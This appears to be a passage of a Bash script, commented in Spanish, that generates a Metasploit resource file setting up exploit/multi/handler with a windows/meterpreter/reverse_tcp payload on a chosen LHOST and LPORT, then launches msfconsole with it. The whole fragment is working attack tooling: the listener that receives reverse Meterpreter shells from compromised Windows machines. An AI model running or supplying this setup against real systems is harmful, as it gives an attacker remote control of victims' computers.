...
#
	touch sploit_1.flo 	#Genera el fichero que tendra el sploit a ejecutar por metasploit
	echo "use exploit/multi/handler" 					>> sploit_1.flo
	echo "set payload windows/meterpreter/reverse_tcp" 	>> sploit_1.flo
	echo "set LHOST "$LHOST 							>> sploit_1.flo
	echo "set LPORT "$LPORT								>> sploit_1.flo
	echo "exploit" 										>> sploit_1.flo
	echo "######################################################################"
	echo "sploit_1.flo"
	more sploit_1.flo 	#Muestra en pantalla el escript que se va a ejecutar
	echo "######################################################################"
#
#	Ejecutamos la consola de Metasploit en conjunto con el fichero que
# 	tiene las instrucciones para metasploit
#
	msfconsole -r sploit_1.flo
#	
